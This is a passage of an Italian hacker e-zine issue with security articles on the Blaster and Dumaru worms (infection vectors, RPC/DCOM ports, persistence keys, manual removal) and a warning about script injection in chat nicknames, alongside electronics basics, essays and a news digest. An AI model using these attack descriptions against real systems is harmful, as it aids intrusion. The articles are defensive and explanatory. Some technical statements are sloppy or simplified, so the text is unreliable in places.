 mi sono proprio rotto di vivere attaccato alla tastiera senza pensare
 un pò di più alla vita reale, che ho l'obbligo come tutti di renderla
 un pò + vivibile... (Leggetivi nella  Zine  3  il trattato filosofico
 sul kosmos capirete un pò di +, come la penso... se vi interessa....)
......•••.•••••••••••••••................
.......•••.•••.•...••.•••.............
.......•••••••••••.••.............
..........••••••••••••.•...............
........•••••••••••......••••••.......
.......••.•....•••..........•..
.............................
............................
..............................
.............................F
..............................F .`.(
...............F 44
........)(J)).
..)F"`
..F .  
(F 4
4)
..

--< unrelated at libero dot it >----------------------------------------
--------------------------------------¤ Lord Unrelated Lodeguns ¤-------
¢••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••


+--[SATELLITARE]---------------------------------------------------------[IL04]+
|  Titolo: OpenSky Resolution                                                  |
|  Autore: Unrelated, Tailot e Mystic                                          |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Se ami il calcio il calcio ama te…  cosa  vi  ricorda  questa  sigla ?  Beh  mi 
dispiace deludere  coloro che  si  aspettavano  un  articolo  sportivo,  stiamo 
parlando   di  Sky,  la  nuova Tv  digitale  che  ha  sostituito  due  fenomeni 
satellitari quali Stram e  Tele+ ! !  Noi di  informazionelibera  siamo  andati 
a studiarci  bene  questa  nuova  realtà  e  vogliamo rendere  note  le  nostre 
conoscenze, direi di fare  un  bel applauso a  Unrelated,  Tailot  e  Mystic  e 
andare a leggere l'articolo OpenSky Resolution tra gli allegati… buona  lettura 
a tutti 

Cyberdude & Informazionelibera staff 


+--[SECURITY]------------------------------------------------------------[IL04]+
|  Titolo: Eliminare Msblaster.exe                                             |
|  Autore: Tailot                                                              |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
IMPROVVISAMENTE MENTRE SIETE ON-LINE IL VOSTRO CALCOLATORE VI DA  60  SECONDI  E
POI SI RIAVVIA! NON E' UNA SCENA DEL FILM "HACKERS" MA IL VIRUS MSBLASTER
********************************************************************************
Il sistema sta per essere arrestato. Salvare tutto il lavoro in corso e chiudere
la  sessione.  Tutte  le modifiche non salvate andranno  perse.  Il  processo  è
iniziato   da  NT  Authority  System.  Riavvio  fra  [40...39...38...]  secondi.
Messaggio:  E' necessario riavviare Windows poiché il servizio Remote  Procedure
Call è terminato in maniera imprevista
********************************************************************************
Questo  il messaggio che appare quando siete stati infettati da w32.blaster,  il
nuovo  worm che sta investendo internet e le macchine ad esso collegate. Innanzi
tutto  chi  può  essere la vittima: possessori di Win NT 4.0 server  e  terminal
services,  win 2000 sia professional che server in tutte le sue versioni,  XP  e
2003  server  in  tutte  le sue versioni (a parte la lite  ma  non  ho  modo  di
verificare).

Il  nome  del virus è Blaster o MSBlaster, il computer che ne è infetto ha  come
unico  sintomo per ora il riavvio dopo un minuto di connessione ad internet  con
il messaggio sopracitato.

E'  abbastanza semplice toglierlo, basta andare sul task manager e  tra  i  vari
processi  attivi selezionare mblast.exe, clickare su termina task  e  quindi  su
termina adesso.

A  questo  punto dopo averlo rimosso dalla memoria basta andare su  start  trova
file o cartelle e cercare il file "*blast.ex* e cancellare tutti i file trovati.
In questo modo viene fisicamente tolto dal disco.

Rimane solo rimuoverlo dal registro di sistema, infatti viene installato come la
maggior  parte  dei  virus nella cartella riportata di seguito  per  assicurarsi
l'avvio automatico alla riaccensione della macchina:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

Fatto  questo  dobbiamo munirci della patch di Microsoft  disponibile  ormai  da
quasi  un  mese  e poi installarla, la patch è di circa un mega  dipendente  dal
sistema  operativo, Questa patch si preoccupa solo di togliere la  vulnerabilità
dal  servizio  di RPC (Remote Procedure Call). Da questo indirizzo  è  possibile
scaricare la patch del vostro sistema operativo:

http://www.microsoft.com/technet/treeview/default.asp?url=/technet/security/bull
etin/ms03-026.asp


BY TAILOT
                              Per ulteriori informazioni:
                              WWW.TAILOT.CJB.NET
                              webmaster@tailot.zzn.com





+--[SECURITY]------------------------------------------------------------[IL04]+
|  Titolo: W.32 Blaster e L'RPC (Remote Procedure Call)                        |
|  Autore: Luke SkyWalker                                                      |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
W.32 Blaster e L'RPC (Remote Procedure Call)
SOMMARIO:
-Intro
-Il Servizio RPC
-La vulenerabilità nei sistemi microsoft...
-Il worm
-conclusioni

*Intro
Classificato  da  casa  microsoft  come "critical"  il  livello  di  rischio  di
W32.Blaster,  colpisce  sistemi windows dove è attivo il  servizio  RPC  (Remote
Procedure Call) quindi Windows NT, 2000, Server 2003 e XP; i sistemi Windows  9x
non sono stati colpiti da questo worm.

*Il servizio RPC
Questo servizio consente ad un programma su un certo computer di eseguire codice
su  un  sistema  remoto. Una delle prime implementazioni di questo  servizio  fu
sviluppata da Sum Microsystems.
Nei  sistemi  windows  il  protocollo è derivato  dal  RPC  OSF  (Open  Software
Foundation), ma con l'aggiunta di alcune estensioni specifiche di Microsoft(Così
dice microsoft...).


*La Vulnerabilità nei sistemi microsoft...
C'é una vulnerabilità nella parte dell'RPC che tratta con lo scambio di messaggi
tramite  TCP/IP. La falla esiste perché c'é una gestione incorretta dei messaggi
malformati.  Distributed  Component Object Model  (DCOM)  con  l'RPC,  il  quale
ascolta  sulle  porte  abilitate, sono affetti da questa  vulnerabilità.  Questa
interfaccia  tratta la richiesta di attivazione dell'oggetto  DCOM  mandate  dai
client  al server. Un attaccker che riesce ad "exploitare" questa falla potrebbe
essere  in  grado  di  eseguire  codice con i  privilegi  di  "LocalSystem"  sul
computer, quindi, potrebbe installare, eseguire programmi creare nuovi  accounts
del  gruppo Administrators (testato personalmente). Io direi che un buon  hacker
potrebbe riuscire a possedere i vostri sistemi in cinque minuti scarsi.
Se   l'attacker   invia   un   messaggio  RPC  appositamente   malformato   dopo
l'instaurazione  di una connessione RPC, nel computer remoto l'interfaccia  DCOM
(Distributed  Component Object Model) con RPC sottostante genera un  errore  che
consente  l'esecuzione  di  codice  non  autorizzato.  Per  "exploitare"  questa
vulnerabilità  l'attacker  deve mandare un pacchetto "speciale"  alla  specifica
porta  dell'RPC  sul  computer  vittima. Le porte  a  cui  l'attacker  manda  il
pacchetto  sono  135,  139,  445 0 593 o su qualche altra  porta  specificamente
configurata  sul computer remoto. Se non bloccate da un packet filter  o  da  un
firewall  queste  porte sono accessibili e se il sistema non  è  aggiornato  con
l'opportuna patch, l'attacker è in grado di sfuttare la vulnerabilità.

*Il Worm
Blaster  contiene  un  messaggio rivolto a Bill Gates, che  tradotto  e':  "Bill
Gates,  perche'  rendi questo possibile? Smetti di fare soldi e sistema  i  tuoi
software!!". Sfruttando la falla, il worm si insinua nel computer attraverso  la
porta  TCP  numero 135 uploadando un file (msblast.exe) e tenta di  generare  un
attacco Denial of Service (DoS) al sito windowsupdate.com, per impedire che  gli
utenti  infetti possano scaricare la patch che impedisce al worm di entrare  nel
sistema.  Sfruttando  la  falla di cui sopra, il worm si  insinua  nel  computer
attraverso la porta TCP numero 135 uploadando un file (msblast.exe) e  tenta  di
generare  un  attacco  Denial  of Service (DoS) al sito  windowsupdate.com,  per
impedire che gli utenti infetti possano scaricare la patch che impedisce al worm
di  entrare nel sistema. Il corrente exploits per la vulnerabilità discussa  nel
precedente paragrafo crea in alcuni casi un backdoor sulla porta 4444/TCP.

*Conclusioni
A  circa un mese di distanza viene scoperta una nuova falla nell'interfaccia RPC
del  modello  DCOM, microsoft rilascia un nuova patch e classifica questo  nuovo
problema  con  il  massimo  fattore di rischi:  "critical".  Le  spiegazioni  di
microsoft  per  questo nuovo bug dell'RPC sono le stesse  date  per  quello  che
sfruttava  il W32.Blaster. Nonostante siano passati circa due mesi  dalla  prima
release della patch (16 luglio 2003), la microsoft ha a malapena corretto i  bug
nel  modello DCOM. Il big di Redmond ha voluto implementare nei suoi sistemi  il
servizio  RPC  creando  nuove falle di sicurezza.  A  questo  punto,  io  direi,
possiamo   affidare  i  nostri  server  a  sistemi  windows?  Dormiremmo   sonni
tranquilli?  A cosa è servita la politica "closed source" del big di  redmond???
La decisione spetta a voi...



+--[SECURITY]------------------------------------------------------------[IL04]+
|  Titolo: W32.Dumaru@mm ... antivirus fai da te                               |
|  Autore: Cyberdude                                                           |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Hey people, da quanto tempo che non ci sentivamo… dunque quest'oggi parliamo un 
po' di security. Di cosa voglio parlarvi oggi? Dunque  voglio  parlarvi  di  un 
virus così idiota ma così idiota che neanche l'antivirus lo riconosce come tale 
questo è una merdaccia di virus appartenente alla specie dei worms (vermi).Cosa 
posso dirvi su  questo  virus ?  Ecco  …  prima  cosa  il  nome,  W32.Dumaru@mm 
Analizziamo cosa fa questo virus … come si comporta, voi  andate  nella  vostra 
casella di posta elettronica come tutti i giorni e scaricate le vostre  e-mail, 
nella cartella posta in arrivo localizzate una e-mail del genere :

From: "Microsoft" <security@microsoft.com> 
Subject: Use this patch immediately ! 
Message: 
Dear friend ,use this Internet Explorer patch now! There are dangerous virus in 
the Internet now! More than 500.000 already infected! 
Attachment: patch.exe 

In pratica vi pregano di istallare la "patch" per prevenire virus … e invece??? 
Ecco qui, il virus è nascosto in patch.exe, voi ciccate  sopra  e  innescate il 
meccanismo.  Come    prima    cosa  il  virus  pensa  a   copiarsi  come  segue 

%Windir%\dllreg.exe 
%System%\load32.exe 
%System%\vxdmgr32.exe 

%Windir% è una variabile il virus localizza  la  cartella  di  istallazione  di 
windows (c:\windows) e si  copia  li  dentro …  %System% a nche  questa  è  una 
variabile, il virus localizza la cartella di sistema e  continua  a  duplicarsi 
qui.  A  questo  punto  vengono   creati  %Windir%\windrv.exe  (8,192 bytes)  e 
%Windir%\winload.log,il primo è un trojan IRC che alla successiva connessione a 
irc ci fa entrare in un canale che recepisce i comandi del creatore del  virus. 
Il secondo invece si copia la vostra rubrica e continua a diffondersi.Una volta 
fatto ciò, aggiunge il valore "load32" = "%Windir%\load32.exe" nel registro  di 
sistema all'indirizzo 

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 

così quando poi andiamo a riavviare windows modifica la sezione di win.ini file 
run=%Windir%\dllreg.exe  e   il  boot  di  system.ini  file  shell=explorer.exe 
%System%\vxdmgr32.exe … questi ultimi due passaggi sono  validi per i  seguenti 
sistemi operativi Windows 95/98/Me.

Dunque per risolvere tale problema la prima cosa da fare è: 

entrare nel regedit.exe nella chiave 

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  

ed eliminare 

"load32"="%Windir%\load32.exe" 

… adesso usciti dal regedit andiamo su:  

start – esegui -  edit c:\windows\win.ini 

si aprirà una finestra dos dove ci sarà una stringa tipo 

run=%Windir%\dllreg.exe 

cancellate tutto il 

%Windir%\dllreg.exe 

in modo da lasciare solo 

run= 

a questo punto file – save  – file – exit … 

ora ripetiamo l'operazione di esegui e questa volta scriviamo :

edit c:\windows\system.ini 

dovrebbe esserci una stringa di testo del tipo:

shell = explorer.exe  %Windir%\vxdmgr32.exe 

anche qui andiamo a cancellare la parte finale, lasciamo solo 

shell = explorer.exe  

e poi 

file – save – file – exit 
Abbiamo eliminato sto stupido virus…  visto? Vi avevo detto  che era  una  cosa 
cretina! Ora vado a studiare un po' di roba seria :( devo studiarmi  matematica 
e chimica per domani!! Che palle ciao ragazzi a presto  

Cyberdude 


+--[SECURITY]------------------------------------------------------------[IL04]+
|  Titolo: Quando la chat diventa un pericolo                                  |
|  Autore: Cyberdude                                                           |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Ciao ragazzi, ai giorni d'oggi siamo in  un  modo dove  l'incapacità  di alcuni 
programmatori e la poca etica della gente calpestata da tutta la feccia che c'è 
in giro rendono questo navigare in  rete  una  cosa  pericolosa… oggi giorno un 
qualunque individuo che sta in rete può  ritrovarsi  il  pc ripulito  da capo a 
fondo senza capire neanche cosa gli sta succedendo!! Ma  in che  mondo viviamo? 
Più che un articolo di sicurezza definirei  il  mio  un  articolo  che serva ad 
aprirvi gli occhi sulla realtà della rete. D unque per  spiegare  meglio il mio 
concetto vi riporto il più banale degli esempi: le  chat …  penso  che chiunque 
almeno  una  volta  nella  sua vita  da  navigatore della rete  abbia fatto una 
capatina in chat per scambiare 2 chiacchiere con  degli amici.  Ebbene la  chat 
rappresenta uno dei maggiori luoghi dove è  possibile  rimanere fregati… adesso 
voi direte ma che stai dicendo? Io mica vado su chat  stupide? Io vado  su chat 
professioniste!! Beh vi dico subito che la storia non cambia!!Perché? Ora ve lo 
spiego … se entrando in chat vedete che  il sito  finisce  con .asp  allora  vi 
consiglio caldamente di cambiare aria, infatti le chat  ASP  soffrono di quello 
che viene comunemente chiamato HTML Injection. Vi  spiego  meglio  il concetto: 
come prima cosa quando c connettiamo ad una chat ci viene richiesto di inserire 
un username (nome utente) … ebbene è qui la falla, basta che un malintenzionato 
qualunque al posto del nick inserisca un codice asp maligno (che non  allegherò 
per non dare modo a qualche lamerozzo di sfruttare tale bug)per far si che tale 
codice sia riversato nella chat e quindi colpisca tutti  gli  utenti connessi a 
quel canale… chiaro? Sapete che addirittura anche Yahoo ha un  bug del  genere? 
Non so  se  avete mai  utilizzato  Yahoo!  Messenger  5.0,  questo  è anch'esso 
vulnerabile a differenza della versione Yahoo!Messenger 5.0 .1065 in cui invece 
questo bug è stato corretto… qui invece basta conoscere un po' di  Javascript o 
un po' di Visul Basic per mandare tutti i chatterini a farsi un bel giretto dal 
tecnico, infatti inserendo il codice maligno nello spazio dove  invece dovrebbe 
andare il testo che leggeranno tutti … questo codice sarà ripetuto  in tutto il 
canale, immaginate se la stringa di codice  inserito  comanda  l'apertura delle 
porte al vostro sistema o qualcosa di peggio  ancora…  consegnereste  il vostro 
sistema al lamerozzo che sfrutta tale sistema!! È vero con questo articolo sono 
andato a spiegare a qualche malintenzionato come  fare per  creare scompigli in 
rete, ma almeno ho spiegato anche a voi perché non conviene stare in chat senza 
le dovute precauzioni… tanto il pirata prima o poi il modo l'avrebbe trovato lo 
stesso… dopotutto basta cercare!!!  Almeno adesso anche voi  siete  allerta.Ora 
vi saluto!! Ciao ragazzi e alla prossima 

Cyberdude 
WebSite: http://www.informazionelibera.cjb.net 
Mailto : cyberdudeIL@libero.it 



+--[ELETTRONICA]---------------------------------------------------------[IL04]+
|  Titolo: Le basi di elettronica                                              |
|  Autore: ^ZaSt^                                                              |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Buongiorno o sera a tutti....
Ebbene.... finalmente ho avuto qualche bell'idea su cosa scrivere.... ( Per  chi
non lo sapesse ancora, sono un ELETTRONICO.... ebbene si, un elettronico con  un
mega passione per l'informatica... ) Comunque... ho deciso di fare una serie  di
articoli  (il  più  reglari  possibili) sull'elettronica...Preavviso.......  NON
intendo   annoiarvi   con   mega   formule  matematiche,   userò   solo   quelle
fondamentali....  Non  sapendo  da  dove  cominciare,  allora...  l'elettronica,
attualmente è un po dappertutto... non si puo spiegare come funziona  un  micro,
un  cell o una tv senza sapere le basi, per cui.... Elettronica... la piu grande
distinzione di sistemi elettronici è tra analogici e digitali... allora...

ANALOGICO: definizione: Si dice analogico un segnale che varia tra un  minimo  e
un massimo con continuità....  CHE SIGNIFICA?????  Per darvi un'idea, la voce  è
analogica.... posso usare qulasiasi volume ( entro certi limiti :P) e  qualunque
tonalità  (idem),  altra  cosa di analogica... la vista...  l'udito...  insomma,
tutte quelle cose che posso assumere infiniti valori...

DIGITALE: definizione: Si dice digitale un segnale che varia tra un minimo e  un
massino passando solo per certi valori....  Ad esempio, un interruttore ( acceso-
spento ) etc...

forse  è  piu facile capirlo facendo dei confronti... Io, guardando un panorama,
vedo un'infinità di colori, di sfumature etc.... Scatto una foto, la importo  al
pc....  Qualunque risoluzione usi, ho sempre un limite ( i colori max supportati
dallo  schermo o dallo scanner ), io al pc ( macchina COMPLETAMENTE  DIGITALE  )
posso  cercare  di  ricostruire una cosa analogica ma non  potro  mai  riuscirci
perfettamente ( immagini pixellose )... certo, oltre certi livelli,  posso  dire
di avere un'immagine QUASI analogica ( 32M di colori sono veramente molti ).

Altra   distinzione  per  l'elettronica  è  quella  ELETTRONICA  di  SEGNALE   e
ELETTRONICA  di  POTENZA. Per elettronica di segnale, si  intende  tutta  quella
circuiteria che compone varie funzioni logiche o di controllo, di potenza invece
è  quella che di solito comanda dei motori, casse, luci e chi più ne ha  più  ne
metta....  La  distinzione  tra  segnale e potenza  è  abbastanza  variabile  in
funzione  del circuito... ciò che da il comando è il segnale, l'attuatore  è  la
potenza.Facciamo  un  esempio  per  chiarire un  po  le  cose.....Esaminiamo  un
sistema: un termometro ( tramite un contatto apposito ) comanda un motore di  un
ventilatore....

La  temperatura  ( ANALOGICA ) fa "muovere il mercurio" del termometro,  questo,
quando  Temp_Ambiente > Temp_Impostata chiude un contatto ( DIGITALE DI  SEGNALE
aperto o chiuso). Questo "comando" fa accendere o speghere un ventilatore  (  DI
POTENZA  ).  Ho parlato di potenza... ( Watt ---> W ) dando per sottointeso  che
sappiate cos'e....  La potenza è "energia". In campo elettrico ed elettronico  è
definito come W=V*I ovvero Potenza=Tensione*Corrente.....

Come unità di misura:
V ----> Volt    pronuncia "volt"
W ----> Watt    pronuncia "vatt"
I ----> Ampere  pronuncia "amper"

NON FANNO IL PLURALE.... :)

A  casa  vostra, le lampadine sono di solito da 60 W ---->   60 W = 220  V  *  I
Girando  la formula la corrente che deve scorrere nel cavo affinchè la lampadina
si  accenda  e  sviluppi i suoi 60W è di I=60/220 = 0.27A  (  ATTENZIONE  !!!!!!
Mentre  i  volt e i watt sono grandezze relativamente piccole, gli  ampere  sono
MOLTO  grandi  ).  Adesso,  vi  do un piccolo assaggio  di  elettronica  vera  e
propria...  Iniziamo dalle basi.... Tutti avete aperto qualcosa ( a partire  dal
Pc  )  e  dentro  cosa avete trovato??? Una MAREA di scatolette nere  con  tanti
piedini  (  tipo  ragnetti ).Cosa sono ???? Sono integrati... Il  loro  scopo  è
quello,  se collegate in determinate maniere, di eseguire operazioni  logiche  (
somme, sottrazioni, moltiplicazioni e divisioni ). Si , tutto qua.... niente  di
MAGICO.... il vostro Pc funziona facendo somme. Incredibile, vero????  I  vostri
giochi,  la  grafica 3D, e anche le nostre foto di prima, sono tutte  realizzate
tramite somme......Magico, vero????  Detto questo....  Non saprei più cosa  dire
senza   entrare  in  campo  specifico...  Ditemi  voi,  cosa  vi  interesserebbe
sapere....   Per   dubbi,  idee,  chiarimenti,  scrivete   a   :   zast@email.it
risponderò il prima possibile.
                             !!! ATTENZIONE !!!

Per  trattare  questi  argomenti  ho dovuto tagliare  molto,  le  cose  per  cui
potrebbero   non   essere  perfettamente  corrette,  servono   solo   per   dare
un'infarinatura generale.
Saluto tutti e....
    "...combatte in ciò in cui credete..."
^ZaSt^



+--[ELETTRONICA]---------------------------------------------------------[IL04]+
|  Titolo: Digitale VS Analogico                                               |
|  Autore: Bigalex                                                             |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
          ----==[ Digitale VS Analogico ]==----

"Siamo nel terzo millennio, l'epoca del digitale. Ormai tutto
o quasi funziona in digitale, che è molto  meglio del vecchio
ed antiquato analogico".
Sarà davvero vera questa citazione?
Io non credo che l'analogico sia tanto male. Ancora molte co-
se funzionano in analogico. Più di quel che pensereste. A co-
minciare dai  telecomandi (che usano diverse  frequenze e non
bit come pensavo facessero), per passare poi ai telefoni pstn
ovverossa i normali telefoni non isdn, per passare ancora al-
la radio che  è sempre analogica, concludendo con  la normale
tv. Questi  sono solo  esempi banali, di elettrodomestici che
funzionano in analogico, e devo dire che funzionano bene.
Per alcune applicazioni (prendiamo una radio ad esempio..) il
digitale non farebbe altro che complicare le cose, necessite-
rebbe di un  totale aggiornamento dell'infrastruttura  su cui 
si basa e non si avrebbero  dei risultati apprezzabili, o al-
meno non in modo immediato. Inoltre, il digitale richiede una
maggiore potenza di calcolo dell'analogico (che richiede poco
o nulla) e necessita di microcontrollori con cui  deve essere
codificato o  decodificato. L'analogico non  richiede  alcuna
codifica. Prendiamo  l'esempio di un paio di casse. Esse fun-
zionano  in modo  analogico, essendo analogici  i segnali che
ricevono. Se venissero  realizzate delle casse  digitali, po-
trebbero usare  un cavo  bifase anzichè trifase  dovendo tra-
sferire semplicemente frames. Tuttavia questi  dovrebbero es-
sere dapprima  codificati e poi  decodificati, ingrandendo in
modo abnorme il  problema. Inoltre i  dati dovrebbero passare
da analogico a digitale e poi di nuovo  da digitale ad analo-
gico. Per un paio  di casse si tratterebbe  di uno sforzo to-
talmente inutile. Ma nel caso in cui le  casse da pilotare in
modo indipendente  siano 10... bhe in questo caso ansicchè u-
sare un bordello di cavi, si userebbe un cavo bifase e si ri-
solverebbero  molti problemi. Questo è il vantaggio del digi-
tale; tuttavia credo che alcune case costruttrici di elettro-
domestici e di "industrie civili" (non saprei come chiamarle)
non abbiano compreso appieno ciò, e si sbizzarriscano a crea-
re roba  digitale a più non posso. Questa roba, oltre che es-
sere spesso inutile, è progettata anche male perchè  deve co-
dificare e  decodificare dei dati inutilmente (sto parlando x
esperienza  personale: ho una radio di una nota  marca che ho
aperto ed ho visto che fa appunto quel che sto dicendo), pro-
babilmente perchè i tecnici credevano che la trasmissione dei
dati in modo  digitale sia migliore... si certo, è vero, ma x
una radio di merda di pochi centimetri cosa vuoi che cambi??
Voglio quindi concludere...
Questo è l'era del digitale, l'era dell'ottimismo (pubblicità
occulta ]:-P ), l'era in cui tutto ciò che è digitale è otti-
mo; ciò che è analogico viene visto con sguardo maligno, qua-
si fosse roba da quattro soldi. Vorrei vedere i dj scratchare
al computer o con  una piastra a cd. Questa è  solo una delle
cose che non  è possibile fare con il digitale. In questo pe-
riodo stiamo  esagerando un pò troppo. Molte  cose potrebbero
essere  più semplici, se solo venissero  progettate con un pò
di cervello in più.

Ciauz!
--
BiGAlex
E-Mail: b1galez@hotmail.com
Founder of the Open C6 Project (openc6.extracon.it)



+--[FILOSOFIA HACK]------------------------------------------------------[IL04]+
|  Titolo: Società consumistica,cos'è e a cosa ci sta portando                 |
|  Autore: Bigalex                                                             |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
----==[Società consumistica, cos'è  e a cosa ci sta portando]==----

Benvenuti nell'era del consumismo. Ormai la società  di oggi è com-
pletamente legata  al consumismo. Tuttavia c'è chi  non sa cos'è e-
sattamente il  consumismo. Perchè diciamo di  vivere in una società
consumistica?
Il concetto di consumismo è stato  brillantemente ideato dagli ame-
ricani che tanto amiamo imitare. E proprio loro hanno inziato a ba-
sare la propria  economia sul  consumismo. Ricordate gli apparecchi
dei vostri nonni? Quelli anni  40-50? Se provate ad usare una radio
di quell'epoca, vedrete  che meravigliosamente  funziona ancora. Ed
ora invece una radio quanto  dura al massimo? Dieci anni sono anche
troppi. Dopo si rompe . E per noi è  normale: quando si rompe se ne
compra un'altra, anche perchè riparare una semplice radio costa or-
mai più che comprarne una nuova e magari  col led che ci avverte se
la batteria è scarica. Allora noi diremo: "Waaaa! E' un affare! C'è
persino il led!!!". E che dire  dei cellulari? Sono ormai costretto
a cambiare un cellulare all'anno perchè ogni volta si rompe qualco-
sa che costa oltre i 100 euro, e con 100 euro mi compro un cellula-
re nuovo. Roba da pazzi. Questo è il consumismo. Si è capito che se
una cosa dura troppo, il mercato si satura e se tutti hanno già una
determinata cosa, difficilmente ne  acquisteranno una uguale. Pren-
diamo le macchine . Dalle mie parti  sono frequentissime le vecchie
126 o le 500 e le nuove macchine. Non si capisce bene perchè, ma le
macchine della fascia immediatamente  successiva alle 500 sono rare
da vedere. E tutte le 500 e le 126 funzionano benissimo. Le macchi-
ne successivamente sono state  progettate per rompersi. E quando si
sono rotte, devono essere acquistate nuovamente. Il mercato in que-
sto modo non si saturerà mai, essendoci un continuo rinnovo. E' co-
me se il commercio fosse diventato una società: c'è chi muore e chi
nasce. Il consumismo ha dato luogo poi ad una vera e propria cultu-
ra particolare: se  non abbiamo l'ultimo  cellulare che consente di
mandare le foto, siamo delle merde. Non valiamo un cazzo. Siamo in-
feriori a coloro che ce l'hanno. Se il cellulare non ha le suonerie
polifoniche, siamo delle merde. Siamo inferiori. Se lo zaino è vec-
chio siamo delle merde.Se l'orologio  non ha l'internet time, siamo
delle merde. Se non  ci adattiamo al sistema  e compriamo l'aspira-
briciole, siamo delle merde. Detto tra noi poi l'aspirabriciole non
serve davvero ad  un cazzo (non che il resto  abbia un'utilità), ma
usa delle batterie  ministilo che 4 costano 5 euro, che tra l'altro
consuma in niente e  se ci passi un panno  bagnato fai molto prima.
Questo è il consumismo. Ci convincono, in modo particolare con tv e
radio, ad acquistare di tutto. E l'apice  di tutto ciò si manifesta
con le continue pubblicità del cazzo che ti permettono con il modi-
co prezzo di 1 euro di ricevere la tua suoneria preferita o il logo
di eminem. Ormai queste pubblicità sono ovunque. L'altro giorno ero
alla ricerca  del mio ennesimo telefonino (che  ho pagato 99 euro e
non manda foto, non  ha le suonerie polifoniche e  che uso solo per
chiamare). Scrivo telefonino siemens su google ed ovviamente il 90%
dei siti si riferivano a suonerie e loghi per il mio siemens. Siamo
arrivati a  livelli troppo alti. Il consumismo  si sta manifestando
in tutta la sua bellezza. "L'economia gira con te". Compra, fai gi-
rare il denaro. Peccato che il denaro che abbiamo è poco e non pos-
siamo spenderlo in loghi e suonerie del cazzo. Non possiamo compra-
re l'ultima  caffettiera che  ti fa anche  la schiuma, non possiamo
comprare il televisore  lcd con colori puliti  che ti incanta e che
non ti fa pensare  ad altro. Questa società non ci sta bene. Tutta-
via una  soluzione c'è. Comprare  solo  ciò di cui si  ha bisogno e
preferire marche italiane. Far crollare i mercati stranieri. Sebbe-
ne ciò  porterà al crollo di  tutti i mercati, che  sono fortemente
collegati tra loro, questo è l'unico modo per far si che questa so-
cietà crolli intaccando il meno possibile il mercato italiano.

"Revolution (not only) digitall. Everyone's invited."

--
BiGAlex
E-Mail: b1galez@hotmail.com
Founder of the Open C6 Project (openc6.extracon.it)

________________________________________________________________________________
+-[APPENDICE AL GIORNALE --> LE NEWS DAL MONDO]--------------------------------+
| Ciao  ragazzi vorrei riportarvi alcune notizie dal mondo degli ultimi giorni!|
| Queste notizie non sono state scritte da me,ma sono reperibili in rete, le ho|
| solo riportate qui per rendervi la vita più facile!! Buona lettura           |
+------------------------------------------------------------------------------+
|  +--[INDICE NEWS]------------------------------------------------------------+
|     +.....................................................................+  |
|     +...Truffa telefonica in un Internet cafe' di Calgary ................+  |
|     +...Il caso McDanel, riabilitato dopo 16 mesi ........................+  |
|     +...Studente sotto accusa x intrusione in1account gestione azionaria .+  |
|     +...Rubati i sorgenti della nuova versione di Half Life ..............+  |
|     +...Sondaggio dice basta a Berlusconi,alla RAI si parla di hacker ....+  |
|     +...Commissione Europea studia organismo per la sicurezza informatica.+  |
|     +.....................................................................+  |
+------------------------------------------------------------------------------+
--------------------------------------------------------------------------------
Truffa telefonica in un Internet cafe' di Calgary
--------------------------------------------------------------------------------
A  Sandra Schulze, proprietaria dell'Hard Disk Cafe' di Calgary, in Canada,  non
e'  rimasto  che render partecipi altri gestori di centri simili  al  suo  della
disavventura  capitatale,  visto che il danno  provocato  da  anonimi  che  sono
riusciti  ad effettuare dal suo locale telefonate intercontinentali per migliaia
di dollari difficilmente le sara' risarcito.

Sembra  che qualcuno sia riuscito a violare il sistema di controllo delle  linee
telefoniche,  impostato  per  inibire  le  chiamate  interurbane.  La  compagnia
telefonica,  accortasi  di  una crescita abnorme del costo  delle  chiamate,  ha
contattato  la  scorsa  domenica  la titolare  del  centro  per  segnalarle  che
risultavano  chiamate  effettuate dal suo locale verso il  Pakistan,  l’India  e
l’Arabia Saudita, per un ammontare di circa 5 mila dollari.

La  Schulze ha quindi informato la polizia di Calgary dell'accaduto, ma l'unita'
antifrode si e' trovata ad ammettere che si tratta del primo caso di questo tipo
verificatosi in zona, e che non sara' facile rintracciare i responsabili.

Come  cio' sia potuto accadere non e' ancora chiaro, ma si ritiene che  qualcuno
sia  riusciti  ad accedere da una linea telefonica esterna ad una delle  quattro
linee  di  accesso al sistema di segreteria telefonica computerizzato e  tramite
questo  sia  riuscito  ad  attivare nel centralino una linea  esterna,  per  poi
effettuare la serie di chiamate a lunga distanza.

L'Hard  Disk  Cafe'  e' un innovativo locale dove, accanto  a  tazze  di  caffe'
fumante  e  panini  imbottiti, ci si puo' collegare a Internet  con  il  proprio
portatile  tramite  la rete wireless a larga banda o dalle  postazioni  messe  a
disposizione dal locale, oltre ad usufruire di numerosi altri servizi.

--------------------------------------------------------------------------------
Il caso McDanel, riabilitato dopo 16 mesi
--------------------------------------------------------------------------------
La  pubblica accusa federale di San Francisco, ha chiesto alla corte di  appello
di  annullare la condanna inflitta dal tribunale di primo grado nei confronti di
un  trentenne accusato di aver utilizzato impropriamente le risorse informatiche
dell'azienda  presso cui era impiegato. Nel frattempo, pero',  Bret  McDanel  ha
dovuto  scontare  16 mesi di condanna, ed e' attualmente in  stato  di  liberta'
vigilata con la proibizione di accedere ad un qualsiasi computer.

E'  particolarmente raro che la pubblica accusa solleciti in appello un giudizio
opposto  rispetto a quello ottenuto in primo grado, ma questo in caso  e'  stata
spinta  a  questa  decisione  dall'ammissione da parte  del  pubblico  ministero
federale  che  gli  investigatori incaricati del  caso  abbiano  agito  in  modo
improprio.

Il  caso  ebbe origine nel settembre del 2000, quando McDanel notifico  con  una
